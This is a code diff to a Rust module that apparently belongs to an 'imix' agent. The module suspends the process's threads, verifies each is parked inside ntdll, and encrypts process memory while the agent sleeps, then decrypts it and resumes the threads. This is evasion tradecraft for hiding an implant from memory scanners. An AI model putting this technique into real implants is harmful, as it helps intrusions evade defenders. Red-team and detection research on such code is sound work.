@@ -10,20 +10,27 @@
 //! - The agent task never blocks a tokio worker synchronously: it hands the
 //!   watchdog a `std::sync::mpsc` wake channel and parks via
 //!   `tokio::task::spawn_blocking(rx.recv())`, then `.await`s the JoinHandle.
-//! - Each cycle the watchdog (1) rebuilds the skip set from *live* thread data,
-//!   (2) runs the bounded dormancy protocol, (3) encrypts, (4) sleeps the
-//!   interval, (5) decrypts, (6) resumes threads, (7) signals the agent.
+//! - Each cycle the watchdog (1) re-enumerates the live thread set, (2) runs the
+//!   bounded dormancy protocol (ThreadState==Waiting pre-check, suspend, Rip-in-
+//!   ntdll re-verify), (3) encrypts, (4) sleeps the interval, (5) decrypts,
+//!   (6) resumes threads, (7) signals the agent.
 //! - During the encrypted window the watchdog must not touch the (now
 //!   PAGE_NOACCESS) process heap, so all per-cycle working state lives on its
-//!   stack or in the engine's pre-allocated state region, and the
-//!   `print_debug` log lines are emitted through a non-allocating writer.
+//!   stack or in the engine's pre-allocated state region, and the `print_debug`
+//!   log lines are emitted through a non-allocating writer.
+//! - Fail-closed: a thread/TEB/stack metadata failure, or a failure to fully
+//!   decrypt, never leads to a corrupted resume. Threads are only resumed and
+//!   the agent only woken after `decrypt()` has fully succeeded; otherwise the
+//!   process terminates with `ExitProcess(1)` (encrypted memory is never exposed
+//!   as plaintext and no suspended thread is ever resumed into corrupted state).
 
 use core::ffi::c_void;
 use std::sync::OnceLock;
 use std::sync::mpsc::{Receiver, Sender, channel};
 use std::thread;
 
-use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
+use windows_sys::Win32::Foundation::CloseHandle;
+use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT;
 use windows_sys::Win32::System::Diagnostics::ToolHelp::{
     CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First, Thread32Next,
 };
@@ -37,10 +44,9 @@ use crate::memguard::MemGuard;
 
 pub const MIN_ENCRYPT_INTERVAL_SECS: f64 = 10.0;
 const RSP_HOT_WINDOW_PAGES: usize = 16;
-const WAIT_STUB_LEN: usize = 0x18;
-const MAX_STUBS: usize = 8;
 const DORMANCY_MAX_ATTEMPTS: usize = 5;
 const DORMANCY_BACKOFF_MS: u64 = 5;
+const DECRYPT_MAX_ATTEMPTS: usize = 30;
 const PAGE_SIZE: usize = 4096;
 const TLS_EXPANSION_SLOTS_OFFSET: usize = 0x1780;
 const CONTEXT_CONTROL: u32 = 0x1;
@@ -62,63 +68,8 @@ unsafe extern "system" {
         lpNumberOfBytesWritten: *mut u32,
         lpOverlapped: *mut c_void,
     ) -> i32;
+    fn ExitProcess(uExitCode: u32) -> !;
     fn GetThreadContext(hThread: *mut c_void, lpContext: *mut CONTEXT) -> i32;
-}
-
-// Raw x64 CONTEXT (CONTEXT_CONTROL subset). The layout is stable across Windows
-// x64; we only set ContextFlags = CONTEXT_CONTROL and read Rip / Rsp.
-#[repr(C)]
-#[allow(non_snake_case, dead_code)]
-struct CONTEXT {
-    P1Home: u64,
-    P2Home: u64,
-    P3Home: u64,
-    P4Home: u64,
-    P5Home: u64,
-    P6Home: u64,
-    ContextFlags: u32,
-    MxCsr: u32,
-    SegCs: u16,
-    SegDs: u16,
-    SegEs: u16,
-    SegFs: u16,
-    SegGs: u16,
-    SegSs: u16,
-    EFlags: u32,
-    Dr0: u64,
-    Dr1: u64,
-    Dr2: u64,
-    Dr3: u64,
-    Dr6: u64,
-    Dr7: u64,
-    Rax: u64,
-    Rcx: u64,
-    Rdx: u64,
-    Rbx: u64,
-    Rsp: u64,
-    Rbp: u64,
-    Rsi: u64,
-    Rdi: u64,
-    R8: u64,
-    R9: u64,
-    R10: u64,
-    R11: u64,
-    R12: u64,
-    R13: u64,
-    R14: u64,
-    R15: u64,
-    Rip: u64,
-}
-
-#[repr(C)]
-struct ThreadBasicInformation {
-    exit_status: i32,
-    teb_base: *mut c_void,
-    unique_process: *mut c_void,
-    unique_thread: *mut c_void,
-    affinity_mask: usize,
-    priority: i32,
-    base_priority: i32,
 }
 
 #[derive(Clone, Copy, Default)]
@@ -133,7 +84,8 @@ struct ThreadSlot {
 }
 
 // RAII guard: resumes any still-suspended threads and closes opened handles when
-// the per-cycle slot buffer leaves scope (including early returns).
+// the per-cycle slot buffer leaves scope (including early returns / skipped
+// cycles).
 struct SlotsGuard<'a> {
     slots: &'a mut [ThreadSlot],
 }
@@ -156,11 +108,6 @@ impl<'a> Drop for SlotsGuard<'a> {
 struct WatchdogCommand {
     wake_tx: Sender<()>,
     interval_secs: f64,
-}
-
-struct WaitStubs {
-    items: [(usize, usize); MAX_STUBS],
-    count: usize,
 }
 
 struct CycleOutcome {
@@ -212,11 +159,15 @@ pub async fn engage_memguard_sleep(interval_secs: f64) -> bool {
 fn ensure_watchdog() -> Option<&'static Sender<WatchdogCommand>> {
     let slot = WATCHDOG_CMD.get_or_init(|| {
         let (cmd_tx, cmd_rx) = channel::<WatchdogCommand>();
-        let wait_stubs = resolve_wait_stubs();
+        let ntdll = resolve_ntdll();
+        let ntdll = match ntdll {
+            Some(n) => n,
+            None => return None,
+        };
         match thread::Builder::new()
             .name("imix-memguard".into())
             .stack_size(8 * 1024 * 1024)
-            .spawn(move || watchdog_main(cmd_rx, wait_stubs))
+            .spawn(move || watchdog_main(cmd_rx, ntdll))
         {
             Ok(_handle) => Some(cmd_tx),
             Err(_) => None,
@@ -225,7 +176,7 @@ fn ensure_watchdog() -> Option<&'static Sender<WatchdogCommand>> {
     slot.as_ref()
 }
 
-fn watchdog_main(cmd_rx: Receiver<WatchdogCommand>, wait_stubs: WaitStubs) {
+fn watchdog_main(cmd_rx: Receiver<WatchdogCommand>, ntdll: (usize, usize)) {
     let ntqit = resolve_ntquery();
     let mut guard: Option<MemGuard> = MemGuard::new();
 
@@ -246,12 +197,9 @@ fn watchdog_main(cmd_rx: Receiver<WatchdogCommand>, wait_stubs: WaitStubs) {
                 continue;
             }
         };
-        let _ = run_cycle(
-            g,
-            ntqit,
-            &wait_stubs.items[..wait_stubs.count],
-            cmd.interval_secs,
-        );
+        let _ = run_cycle(g, ntqit, ntdll.0, ntdll.1, cmd.interval_secs);
+        // The cycle only returns after a full decrypt (resume+wake) or a clean
+        // skip; a failed decrypt terminates the process in `ensure_decrypted`.
         let _ = cmd.wake_tx.send(());
     }
 }
@@ -279,48 +227,36 @@ fn resolve_ntquery() -> Option<NtQueryInformationThreadFn> {
     }
 }
 
-fn resolve_wait_stubs() -> WaitStubs {
-    let names: &[&[u8]] = &[
-        b"NtWaitForSingleObject\0",
-        b"NtWaitForAlertByThreadId\0",
-        b"NtRemoveIoCompletion\0",
-        b"NtDelayExecution\0",
-        b"NtWaitForMultipleObjects\0",
-        b"SleepConditionVariableSRW\0",
-        b"WaitForSingleObjectEx\0",
-    ];
-    let m0 = wstr("ntdll.dll");
-    let m1 = wstr("kernel32.dll");
-    let m2 = wstr("kernelbase.dll");
-    let modules: &[&[u16]] = &[m0.as_slice(), m1.as_slice(), m2.as_slice()];
-    let mut stubs = WaitStubs {
-        items: [(0usize, 0usize); MAX_STUBS],
-        count: 0,
-    };
+/// Resolve ntdll's load base and image size by parsing the PE headers of the
+/// already-mapped module. Used so the Rip safe-point check is "is Rip inside
+/// ntdll?" rather than a brittle stub-allowlist.
+fn resolve_ntdll() -> Option<(usize, usize)> {
     unsafe {
-        for name in names {
-            if stubs.count >= MAX_STUBS {
-                break;
-            }
-            let mut resolved: *mut c_void = core::ptr::null_mut();
-            for m in modules {
-                let h = GetModuleHandleW(m.as_ptr());
-                if !h.is_null() {
-                    let p = GetProcAddress(h, name.as_ptr());
-                    if !p.is_null() {
-                        resolved = p;
-                        break;
-                    }
-                }
-            }
-            if !resolved.is_null() {
-                let start = resolved as usize;
-                stubs.items[stubs.count] = (start, start + WAIT_STUB_LEN);
-                stubs.count += 1;
-            }
+        let base = GetModuleHandleW(wstr("ntdll.dll").as_ptr()) as usize;
+        if base == 0 {
+            return None;
         }
+        let dos = base as *const u8;
+        // IMAGE_DOS_HEADER.e_lfanew is a 4-byte LE offset at 0x3C.
+        let e_lfanew = core::ptr::read_unaligned(dos.add(0x3C) as *const i32) as usize;
+        // Sanity-bound: the PE header lives near the head of the mapped image.
+        if e_lfanew == 0 || e_lfanew >= 0x4000 {
+            return None;
+        }
+        let pe = dos.add(e_lfanew);
+        let sig = core::slice::from_raw_parts(pe, 4);
+        if sig != b"PE\0\0" {
+            return None;
+        }
+        // SizeOfImage sits at OptionalHeader+0x38; OptionalHeader starts after
+        // the 4-byte signature and the 20-byte COFF FileHeader.
+        let size_of_image =
+            core::ptr::read_unaligned(dos.add(e_lfanew + 0x4 + 20 + 0x38) as *const u32) as usize;
+        if size_of_image == 0 {
+            return None;
+        }
+        Some((base, size_of_image))
     }
-    stubs
 }
 
 fn wstr(s: &str) -> Vec<u16> {
@@ -343,9 +279,23 @@ fn region_size_of(ptr: *mut c_void) -> usize {
     }
 }
 
-fn rip_in_wait_stub(rip: u64, stubs: &[(usize, usize)]) -> bool {
+fn thread_state(ntqit: NtQueryInformationThreadFn, handle: *mut c_void) -> Option<u32> {
+    let mut state: u32 = 0;
+    let status = unsafe {
+        ntqit(
+            handle,
+            THREAD_STATE_CLASS,
+            &mut state as *mut u32 as *mut c_void,
+            4,
+            core::ptr::null_mut(),
+        )
+    };
+    if status >= 0 { Some(state) } else { None }
+}
+
+fn rip_in_ntdll(rip: u64, ntdll_base: usize, ntdll_size: usize) -> bool {
     let r = rip as usize;
-    stubs.iter().any(|(s, e)| r >= *s && r < *e)
+    r >= ntdll_base && r < ntdll_base + ntdll_size
 }
 
 fn sleep_backoff(attempt: usize) {
@@ -353,51 +303,75 @@ fn sleep_backoff(attempt: usize) {
     unsafe { Sleep(ms as u32) };
 }
 
-fn thread_state(ntqit: NtQueryInformationThreadFn, handle: *mut c_void) -> Option<u32> {
-    let mut state: u32 = 0;
-    let status = ntqit(
-        handle,
-        THREAD_STATE_CLASS,
-        &mut state as *mut u32 as *mut c_void,
-        4,
-        core::ptr::null_mut(),
-    );
-    if status >= 0 { Some(state) } else { None }
-}
-
-// Enumerate the current process's threads (excluding the watchdog TID) into a
-// stack buffer. Returns the live count, or `None` on any failure that prevents a
-// safe dormancy pass (we then skip the cycle rather than encrypt around a thread
-// we could not account for).
+/// Enumerate the current process's threads (excluding the watchdog TID) into a
+/// stack buffer. Returns the live count, or `None` on any failure that prevents a
+/// safe dormancy pass (we then skip the cycle rather than encrypt around a thread
+/// we could not account for). Thread32First failing is a hard failure, not the
+/// end of the snapshot.
+///
+/// Any handles from a previous enumeration still present in `buf` are closed
+/// first, so re-enumeration across dormancy attempts never leaks.
 fn enumerate_threads(
     self_tid: u32,
     ntqit: NtQueryInformationThreadFn,
     buf: &mut [ThreadSlot],
 ) -> Option<usize> {
+    // Close any handles left over from a prior attempt's enumeration.
+    for s in buf.iter_mut() {
+        if !s.handle.is_null() {
+            unsafe { CloseHandle(s.handle) };
+            s.handle = core::ptr::null_mut();
+        }
+        *s = ThreadSlot::default();
+    }
+
     let pid = unsafe { GetCurrentProcessId() };
     let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
-    if snap == INVALID_HANDLE_VALUE {
+    if snap.is_null() {
         return None;
     }
+
     let mut te: THREADENTRY32 = unsafe { core::mem::zeroed() };
     te.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
+
     let mut count = 0usize;
-    let mut first = true;
+    let mut done_first = false;
     loop {
-        let ok = if first {
-            first = false;
+        let ok = if !done_first {
             unsafe { Thread32First(snap, &mut te) != 0 }
         } else {
             unsafe { Thread32Next(snap, &mut te) != 0 }
         };
         if !ok {
+            if !done_first {
+                // Thread32First failed: this is an enumeration failure, not a
+                // clean end-of-snapshot. Fail closed.
+                unsafe { CloseHandle(snap) };
+                for s in buf.iter_mut() {
+                    if !s.handle.is_null() {
+                        unsafe { CloseHandle(s.handle) };
+                        s.handle = core::ptr::null_mut();
+                    }
+                }
+                return None;
+            }
             break;
         }
+        done_first = true;
+
         if te.th32OwnerProcessID != pid || te.th32ThreadID == self_tid {
             continue;
         }
         if count >= buf.len() {
+            // Too many threads to account for: fail closed. Close the handles we
+            // already opened before returning.
             unsafe { CloseHandle(snap) };
+            for s in buf.iter_mut() {
+                if !s.handle.is_null() {
+                    unsafe { CloseHandle(s.handle) };
+                    s.handle = core::ptr::null_mut();
+                }
+            }
             return None;
         }
         let handle = unsafe {
@@ -409,9 +383,11 @@ fn enumerate_threads(
         };
         if handle.is_null() {
             unsafe { CloseHandle(snap) };
-            for s in &mut buf[..count] {
-                unsafe { CloseHandle(s.handle) };
-                s.handle = core::ptr::null_mut();
+            for s in buf.iter_mut() {
+                if !s.handle.is_null() {
+                    unsafe { CloseHandle(s.handle) };
+                    s.handle = core::ptr::null_mut();
+                }
             }
             return None;
         }
@@ -436,13 +412,15 @@ fn read_teb(
     handle: *mut c_void,
 ) -> (*mut c_void, *mut c_void, *mut c_void) {
     let mut tbi = core::mem::MaybeUninit::<ThreadBasicInformation>::uninit();
-    let status = ntqit(
-        handle,
-        THREAD_BASIC_INFORMATION_CLASS,
-        tbi.as_mut_ptr() as *mut c_void,
-        core::mem::size_of::<ThreadBasicInformation>() as u32,
-        core::ptr::null_mut(),
-    );
+    let status = unsafe {
+        ntqit(
+            handle,
+            THREAD_BASIC_INFORMATION_CLASS,
+            tbi.as_mut_ptr() as *mut c_void,
+            core::mem::size_of::<ThreadBasicInformation>() as u32,
+            core::ptr::null_mut(),
+        )
+    };
     if status < 0 {
         return (
             core::ptr::null_mut(),
@@ -465,10 +443,26 @@ fn read_teb(
     }
 }
 
+// Mirrors engine.rs's THREAD_BASIC_INFORMATION layout (x64), read via
+// NtQueryInformationThread(ThreadBasicInformation=0).
+#[repr(C)]
+struct ThreadBasicInformation {
+    exit_status: i32,
+    teb_base: *mut c_void,
+    unique_process: *mut c_void,
+    unique_thread: *mut c_void,
+    affinity_mask: usize,
+    priority: i32,
+    base_priority: i32,
+}
+
+/// Add TEB/PEB/TLS exclusions for every live thread. A null TEB means we cannot
+/// exclude that thread's thread-local state, which is unsafe to encrypt around,
+/// so we fail closed (return `false`).
 fn add_thread_state_exclusions(guard: &mut MemGuard, slots: &[ThreadSlot]) -> bool {
     for s in slots {
         if s.teb.is_null() {
-            continue;
+            return false;
         }
         let teb_size = region_size_of(s.teb);
         if teb_size > 0 && !guard.add_exclusion(s.teb as *const u8, teb_size) {
@@ -501,19 +495,21 @@ fn add_thread_state_exclusions(guard: &mut MemGuard, slots: &[ThreadSlot]) -> bo
     true
 }
 
-// Exclude the watchdog's own thread-local state and entire stack. The watchdog
-// is Running while it owns the encrypted window, so its TEB/PEB/TLS and stack
-// must stay in the unencrypted set or it would fault on its own state.
+/// Exclude the watchdog's own thread-local state and entire stack. The watchdog
+/// is Running while it owns the encrypted window, so its TEB/PEB/TLS and stack
+/// must stay in the unencrypted set or it would fault on its own state.
 fn add_watchdog_exclusions(guard: &mut MemGuard, ntqit: NtQueryInformationThreadFn) -> bool {
     let cur = unsafe { GetCurrentThread() };
     let mut tbi = core::mem::MaybeUninit::<ThreadBasicInformation>::uninit();
-    let status = ntqit(
-        cur,
-        THREAD_BASIC_INFORMATION_CLASS,
-        tbi.as_mut_ptr() as *mut c_void,
-        core::mem::size_of::<ThreadBasicInformation>() as u32,
-        core::ptr::null_mut(),
-    );
+    let status = unsafe {
+        ntqit(
+            cur,
+            THREAD_BASIC_INFORMATION_CLASS,
+            tbi.as_mut_ptr() as *mut c_void,
+            core::mem::size_of::<ThreadBasicInformation>() as u32,
+            core::ptr::null_mut(),
+        )
+    };
     if status < 0 {
         return false;
     }
@@ -564,17 +560,19 @@ fn add_watchdog_exclusions(guard: &mut MemGuard, ntqit: NtQueryInformationThread
     true
 }
 
+/// Exclude only the +-RSP_HOT_WINDOW_PAGES window around a suspended thread's
+/// captured Rsp. Any missing/garbled stack metadata is a fail-closed condition:
+/// we never fall back to excluding the whole stack (that would leave the rest of
+/// the stack encrypted while the thread resumes into it).
 fn add_rsp_window_exclusion(guard: &mut MemGuard, s: &ThreadSlot) -> bool {
     if s.stack_base.is_null() || s.stack_limit.is_null() {
-        // No stack bounds known: exclude the whole stack to be safe rather than
-        // leave it partially encrypted around an unknown Rsp.
-        return true;
+        return false;
     }
     let base = s.stack_limit as usize;
     let top = s.stack_base as usize;
     let rsp = s.rsp as usize;
     if rsp < base || rsp > top {
-        return guard.add_exclusion(s.stack_limit as *const u8, top - base);
+        return false;
     }
     let window = RSP_HOT_WINDOW_PAGES * PAGE_SIZE;
     let mut lo = rsp.saturating_sub(window);
@@ -586,7 +584,7 @@ fn add_rsp_window_exclusion(guard: &mut MemGuard, s: &ThreadSlot) -> bool {
         hi = top;
     }
     if hi <= lo {
-        return true;
+        return false;
     }
     guard.add_exclusion(lo as *const u8, hi - lo)
 }
@@ -597,20 +595,45 @@ enum DormancyResult {
     Fail,
 }
 
-// Bounded dormancy protocol. Suspends every non-watchdog thread that is
-// currently Waiting and re-verifies each one is frozen inside a known ntdll /
-// kernel wait stub (Rip captured via GetThreadContext). On success the RSP hot
-// window for each suspended thread is added to the engine's skip set.
+// Bounded dormancy protocol. Re-enumerates the live thread set on every
+// attempt. Suspends every non-watchdog thread that is currently Waiting and
+// re-verifies each one is frozen inside ntdll (Rip captured via
+// GetThreadContext). On success the TEB/PEB/TLS and RSP hot-window exclusions for
+// each suspended thread are added to the engine's skip set.
+//
+// The engine's dynamic skip is rebuilt at the start of every attempt so per-
+// attempt exclusions never accumulate. Thread/TEB/stack metadata failures are
+// fail-closed: the cycle is aborted (the caller skips).
+//
+// Returns `(result, live_count)`.
 fn run_dormancy(
     guard: &mut MemGuard,
+    self_tid: u32,
     ntqit: NtQueryInformationThreadFn,
-    slots: &mut [ThreadSlot],
-    stubs: &[(usize, usize)],
-) -> DormancyResult {
+    ntdll_base: usize,
+    ntdll_size: usize,
+    buf: &mut [ThreadSlot],
+) -> (DormancyResult, usize) {
     for attempt in 0..DORMANCY_MAX_ATTEMPTS {
+        // Rebuild the skip set from scratch each attempt.
+        guard.clear_dynamic_exclusions();
+        if !add_watchdog_exclusions(guard, ntqit) {
+            return (DormancyResult::Fail, 0);
+        }
+
+        let n = match enumerate_threads(self_tid, ntqit, buf) {
+            Some(n) => n,
+            None => return (DormancyResult::Fail, 0),
+        };
+
+        if !add_thread_state_exclusions(guard, &buf[..n]) {
+            resume_all(&mut buf[..n]);
+            return (DormancyResult::Fail, 0);
+        }
+
         // Pre-check: every candidate thread must report ThreadState == Waiting.
         let mut all_waiting = true;
-        for s in slots.iter_mut() {
+        for s in buf[..n].iter_mut() {
             s.suspended = false;
             if thread_state(ntqit, s.handle) != Some(THREAD_STATE_WAITING) {
                 all_waiting = false;
@@ -625,7 +648,7 @@ fn run_dormancy(
         // Suspend every candidate. Previous suspend count must be 0 (we must not
         // disturb a thread already suspended by a debugger).
         let mut suspend_ok = true;
-        for s in slots.iter_mut() {
+        for s in buf[..n].iter_mut() {
             let prev = unsafe { SuspendThread(s.handle) };
             if prev == u32::MAX {
                 suspend_ok = false;
@@ -640,39 +663,41 @@ fn run_dormancy(
             s.suspended = true;
         }
         if !suspend_ok {
-            resume_all(slots);
+            resume_all(&mut buf[..n]);
             sleep_backoff(attempt);
             continue;
         }
 
-        // Re-verify: each suspended thread must be frozen at a wait-stub Rip.
+        // Re-verify: each suspended thread must be frozen inside ntdll.
         let mut verify_ok = true;
-        for s in slots.iter_mut() {
+        for s in buf[..n].iter_mut() {
             let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
             ctx.ContextFlags = CONTEXT_CONTROL;
             let ok = unsafe { GetThreadContext(s.handle, &mut ctx) } != 0;
-            if !ok || !rip_in_wait_stub(ctx.Rip, stubs) {
+            if !ok || !rip_in_ntdll(ctx.Rip, ntdll_base, ntdll_size) {
                 verify_ok = false;
                 break;
             }
             s.rsp = ctx.Rsp;
         }
         if !verify_ok {
-            resume_all(slots);
+            resume_all(&mut buf[..n]);
             sleep_backoff(attempt);
             continue;
         }
 
-        // All dormant: add the RSP hot window for each suspended thread.
-        for s in slots.iter() {
+        // All dormant: add the RSP hot window for each suspended thread. A failure
+        // here is fail-closed (we must not encrypt around a thread whose in-use
+        // stack window we could not exclude).
+        for s in buf[..n].iter() {
             if !add_rsp_window_exclusion(guard, s) {
-                resume_all(slots);
-                return DormancyResult::Fail;
+                resume_all(&mut buf[..n]);
+                return (DormancyResult::Fail, 0);
             }
         }
-        return DormancyResult::Ok;
+        return (DormancyResult::Ok, n);
     }
-    DormancyResult::RetryExhausted
+    (DormancyResult::RetryExhausted, 0)
 }
 
 fn resume_all(slots: &mut [ThreadSlot]) {
@@ -684,49 +709,78 @@ fn resume_all(slots: &mut [ThreadSlot]) {
     }
 }
 
+/// Snapshot the current live thread TIDs (excluding the watchdog) and verify the
+/// set matches `slots`. If a thread was created or destroyed between the
+/// successful dormancy pass and here, the in-flight thread set is not what we
+/// just excluded around, so the caller must abort the cycle.
+fn thread_set_unchanged(self_tid: u32, slots: &[ThreadSlot]) -> bool {
+    let mut current: Vec<u32> = Vec::new();
+    unsafe {
+        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if snap.is_null() {
+            return false;
+        }
+        let mut te: THREADENTRY32 = core::mem::zeroed();
+        te.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
+        let mut first = true;
+        loop {
+            let ok = if first {
+                first = false;
+                Thread32First(snap, &mut te) != 0
+            } else {
+                Thread32Next(snap, &mut te) != 0
+            };
+            if !ok {
+                break;
+            }
+            if te.th32OwnerProcessID == GetCurrentProcessId() && te.th32ThreadID != self_tid {
+                current.push(te.th32ThreadID);
+            }
+        }
+        CloseHandle(snap);
+    }
+    if current.len() != slots.len() {
+        return false;
+    }
+    let mut a = current;
+    let mut b: Vec<u32> = slots.iter().map(|s| s.tid).collect();
+    a.sort_unstable();
+    b.sort_unstable();
+    a == b
+}
+
+/// Decrypt until fully complete. Retries with backoff; if it still fails the
+/// process terminates with `ExitProcess(1)` so encrypted memory is never exposed
+/// as plaintext and no suspended thread is resumed into corrupted state.
+fn ensure_decrypted(guard: &mut MemGuard) {
+    for attempt in 0..DECRYPT_MAX_ATTEMPTS {
+        if guard.decrypt() {
+            return;
+        }
+        sleep_backoff(attempt);
+    }
+    // Final attempt; if pages remain encrypted, die rather than resume corrupted.
+    if guard.encrypted_count() != 0 {
+        unsafe { ExitProcess(1) };
+    }
+}
+
 fn run_cycle(
     guard: &mut MemGuard,
     ntqit: NtQueryInformationThreadFn,
-    stubs: &[(usize, usize)],
+    ntdll_base: usize,
+    ntdll_size: usize,
     interval_secs: f64,
 ) -> CycleOutcome {
-    guard.clear_dynamic_exclusions();
     let self_tid = unsafe { GetCurrentThreadId() };
 
     let mut slot_buf = [ThreadSlot::default(); MAX_THREADS];
-    let n = match enumerate_threads(self_tid, ntqit, &mut slot_buf) {
-        Some(n) => n,
-        None => {
-            emit_skip("thread enumeration failed");
-            plain_sleep(interval_secs);
-            return CycleOutcome {
-                pages: 0,
-                skipped: true,
-            };
-        }
-    };
-    let slots = SlotsGuard {
-        slots: &mut slot_buf[..n],
+    let mut slots = SlotsGuard {
+        slots: &mut slot_buf,
     };
 
-    if !add_thread_state_exclusions(guard, slots.slots) {
-        emit_skip("exclusion capacity");
-        plain_sleep(interval_secs);
-        return CycleOutcome {
-            pages: 0,
-            skipped: true,
-        };
-    }
-    if !add_watchdog_exclusions(guard, ntqit) {
-        emit_skip("exclusion capacity");
-        plain_sleep(interval_secs);
-        return CycleOutcome {
-            pages: 0,
-            skipped: true,
-        };
-    }
-
-    match run_dormancy(guard, ntqit, slots.slots, stubs) {
+    let (dormancy, n) = run_dormancy(guard, self_tid, ntqit, ntdll_base, ntdll_size, slots.slots);
+    match dormancy {
         DormancyResult::Ok => {}
         DormancyResult::RetryExhausted => {
             emit_skip("running threads");
@@ -746,11 +800,22 @@ fn run_cycle(
         }
     }
 
+    // Guard against threads created/removed between the successful pass and here.
+    if !thread_set_unchanged(self_tid, &slots.slots[..n]) {
+        resume_all(&mut slots.slots[..n]);
+        emit_skip("thread set changed");
+        plain_sleep(interval_secs);
+        return CycleOutcome {
+            pages: 0,
+            skipped: true,
+        };
+    }
+
     if !guard.encrypt() {
-        // Encrypt failed mid-pass: restore whatever was already XOR'd, then
-        // resume. Fail-safe is an unencrypted cycle, never a corrupted process.
+        // Encrypt failed mid-pass: restore whatever was already XOR'd. If that
+        // restore fails, terminate — never resume into corrupted state.
         emit_skip("encrypt failed");
-        let _ = guard.decrypt();
+        ensure_decrypted(guard);
         plain_sleep(interval_secs);
         return CycleOutcome {
             pages: 0,
@@ -759,19 +824,16 @@ fn run_cycle(
     }
 
     let pages = guard.encrypted_count();
-    let dormant = slots.slots.iter().filter(|s| s.suspended).count();
+    let dormant = slots.slots[..n].iter().filter(|s| s.suspended).count();
     emit_engage(dormant, pages, interval_secs);
 
     plain_sleep(interval_secs);
 
-    // Decrypt is resumable; retry on a transient VirtualProtect failure.
-    for _ in 0..DORMANCY_MAX_ATTEMPTS {
-        if guard.decrypt() {
-            break;
-        }
-    }
+    // Decrypt must fully succeed before any thread is resumed or the agent
+    // woken. A failed decrypt terminates the process.
+    ensure_decrypted(guard);
 
-    let resumed = slots.slots.iter().filter(|s| s.suspended).count();
+    let resumed = slots.slots[..n].iter().filter(|s| s.suspended).count();
     emit_wake(pages, resumed);
     // `slots` drops here: resumes any still-suspended threads and closes handles.
     CycleOutcome {
@@ -890,7 +952,6 @@ fn emit_wake(_pages: usize, _resumed: usize) {}
 #[cfg(all(windows, feature = "mem-obfuscation", test))]
 mod tests {
     use super::*;
-    use std::sync::mpsc;
     use std::time::Duration;
 
     #[test]
@@ -899,18 +960,17 @@ mod tests {
         // MemGuard singleton.
         let _g = crate::memguard::TEST_LOCK.lock().unwrap();
 
-        let (tx, rx) = mpsc::channel::<()>();
-        // Park in a kernel wait so the dormancy protocol can verify a known
-        // wait-stub Rip (std mpsc recv parks via a condvar on Windows).
+        // Park a thread inside ntdll (NtDelayExecution) so the dormancy
+        // protocol's Rip-in-ntdll re-verify accepts it as dormant.
         let parked = std::thread::spawn(move || {
-            let _ = rx.recv();
+            std::thread::sleep(Duration::from_millis(1000));
         });
 
         let ntqit = resolve_ntquery().expect("NtQueryInformationThread unavailable");
-        let stubs = resolve_wait_stubs();
+        let (ntdll_base, ntdll_size) = resolve_ntdll().expect("ntdll resolve");
         let mut guard = MemGuard::new().expect("memguard init");
 
-        let outcome = run_cycle(&mut guard, ntqit, &stubs.items[..stubs.count], 0.0);
+        let outcome = run_cycle(&mut guard, ntqit, ntdll_base, ntdll_size, 0.0);
         assert!(
             !outcome.skipped,
             "dormancy cycle should encrypt, not skip (parked thread not seen as dormant?)"
@@ -922,10 +982,6 @@ mod tests {
             "all pages should be decrypted after the cycle"
         );
 
-        // Wake and join the parked thread.
-        let _ = tx.send(());
         parked.join().expect("parked thread joined");
-        // Give the joined thread a moment; not strictly required.
-        let _ = Duration::from_millis(0);
     }
 }
